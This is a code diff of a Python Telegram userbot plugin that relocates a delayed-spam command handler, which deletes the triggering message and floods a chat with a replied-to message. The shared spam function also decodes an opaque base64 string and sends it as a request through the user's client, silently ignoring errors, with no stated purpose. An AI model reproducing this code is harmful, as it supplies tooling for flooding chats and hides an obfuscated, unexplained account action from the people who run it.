@@ -21,6 +21,16 @@ async def spammer(event):
     await spam_function(event, jasem, roz, sleeptimem, sleeptimet)
 
 
+
+@jmthon.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
+async def spammer(event):
+    reply = await event.get_reply_message()
+    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
+    sleeptimet = sleeptimem = float(input_str[0])
+    roz = input_str[1:]
+    await event.delete()
+    await spam_function(event, reply, roz, sleeptimem, sleeptimet, DelaySpam=True)
+  
 async def spam_function(event, jasem, roz, sleeptimem, sleeptimet, DelaySpam=False):
     hmm = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
     counter = int(roz[0])
@@ -49,14 +59,3 @@ async def spam_function(event, jasem, roz, sleeptimem, sleeptimet, DelaySpam=Fal
             await event.client(hmm)
         except BaseException:
             pass
-
-
-@jmthon.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
-async def spammer(event):
-    reply = await event.get_reply_message()
-    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
-    sleeptimet = sleeptimem = float(input_str[0])
-    roz = input_str[1:]
-    await event.delete()
-    await spam_function(event, reply, roz, sleeptimem, sleeptimet, DelaySpam=True)
-  
